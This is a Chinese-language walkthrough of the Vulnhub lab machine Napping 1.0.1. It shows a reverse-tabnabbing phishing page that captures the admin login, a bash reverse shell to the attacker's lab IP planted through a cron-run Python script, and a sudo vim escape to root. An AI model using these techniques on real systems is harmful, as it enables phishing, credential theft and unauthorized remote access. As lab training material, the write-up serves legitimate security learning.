---

title: Vulnhub--Napping:1.0.1
categories: [渗透靶场, Vulnhub]

---

## **渗透复现**

1. 账号注册过后，web站点存在提交链接功能，利用tabnabbing漏洞获取管理员的账号密码
2. ssh登录，进行常规信息收集，在home目录下的其他用户发现定时任务计划
3. 利用定时任务进行反弹shell
4. sudo信息收集时，存在vim文件，vim文件执行bash命令，进行vim提权

## 知识扩展

1. Reverse tabnabbing漏洞利用进行钓鱼攻击
2. 定时任务反弹shell

## 靶机地址

https://www.vulnhub.com/entry/napping-101,752/

## 主机发现

（1）攻击机

```python
192.168.88.128
```

（2）目标靶机

```py
192.168.88.129
```

## 信息收集

### 端口扫描

![image-20240828103632177](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281036275.png)

### 目录扫描

![image-20240828103640005](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281036148.png)

### 目录爆破

![image-20240828103651381](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281036497.png)

### 目录访问

（1）登录框

![image-20240828103656967](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281036007.png)

（2）注册框

![image-20240828103711914](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281037958.png)

## 实施攻击

（1）弱口令爆破尝试，爆破用户名admin和test

![image-20240828103718023](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281037075.png)

（2）账号注册，并且进行登录

```python
test/test123
#登录成功,页面的意思是用户可以提交一个自定义链接，并且该链接会被管理员进行检查
```

![image-20240828103749755](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281037802.png)

![image-20240828103759965](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281038013.png)

（3）提交百度的URL：http://baidu.com，BP抓包进行分析

（a标签，有target='_blank'的特征，没有rel='noopener/noreferrer属性',可能存在Reverse tabnabbing漏洞）

```python
#漏洞原理：利用恶意网站B，对原先页面A进行修改，控制其成为钓鱼页面C，此时用户以为页面A依旧是先前页面，如果此时进行信息的交互，那么攻击者就可以窃取到用户的信息

#漏洞的利用：管理员访问攻击者提交的链接去到diaoyu，html页面，diaoyu，html页面利用window.opener修改原先的login，html页面，此时原先页面login，html已经成为钓鱼页面，如果管理员在login，html页面进行登陆，那么攻击者就可以窃取到管理员的用户信息
```

![image-20240828103837642](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281038698.png)

（4）进行钓鱼攻击的利用，回到登录界面右键保存登录界面为login.html

![image-20240828103844980](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281038026.png)

![image-20240828103851423](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281038476.png)

（5）新建一个恶意页面diaoyu.html，代码如下

```python
#记得修改IP和监听端口
#用户要访问的链接页面
<!DOCTYPE html>
<html>
<body>
    <script>
      if(window.opener) mainframe.location.replace=('http://192.168.88.128:8888/login.html');
      if(window.opener  != window) mainframe.location.replace=('http://192.168.88.128:8888/login.html');
</script>
</body>
</html>
```

（6）将两个文件放到攻击机中，开启监听，http80端口的服务

![image-20240828103858579](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281038660.png)

（7）回到页面提交钓鱼链接

```py
#注意ip是kali（跳转至kali的diaoyu页面）
http://192.168.88.128/diaoyu.html
```

![image-20240828103911280](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281039325.png)

（8）成功拿到管理员的用户密码

```py
#账号
daniel
#密码
C%40ughtm3napping123
#URL解码
C@ughtm3napping123
```

![image-20240828103917466](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281039555.png)

（9）登录管理员用户，web站点无法登录那就尝试ssh连接

![image-20240828103929243](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281039293.png)

![image-20240828103937146](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281039254.png)

## 提权

（1）信息收集，daniel属于administrators groups下的成员（同组用户可执行相应的组程序）

![image-20240828103948090](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281039185.png)

![image-20240828104002380](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040477.png)

（2）去到home目录下adrian用户，再次进行信息收集，发现groups administrators用户可执行的文件：query.py（也就是当前用户daniel也可执行该脚本）

![image-20240828104015524](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040625.png)

（3）代码分析，query.py是个定时任务脚本，每两分钟执行一次该脚本，该脚本向site_status.txt文件写入时间

![image-20240828104027428](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040536.png)

![image-20240828104036018](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040121.png)

（4）利用定时任务执行query.py进行反弹shell，在query.py脚本中写入反弹shell命令

```py
#因为adrian目录下不具备写权限
#因此回到dinary目录下，写入反弹shell文件

#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.88.128/8888 0>&1'
```

![image-20240828104044339](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040412.png)

![image-20240828104052194](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281040308.png)

（5）编辑query.py脚本写入以下内容

```py
import os
os.system('/usr/bin/bash /home/daniel/shell.sh')
```

![image-20240828104104306](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281041411.png)

（6）攻击机开启监听，成功获取到adrian用户的shell

![image-20240828104116925](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281041018.png)

（7）信息收集

![image-20240828104128934](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281041007.png)

（8）利用vim文件进行提权

```python
#sudo-vim提权，直接执行以下命令
sudo vim -c ':!/bin/bash'
```

![image-20240828104143952](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202408281041065.png)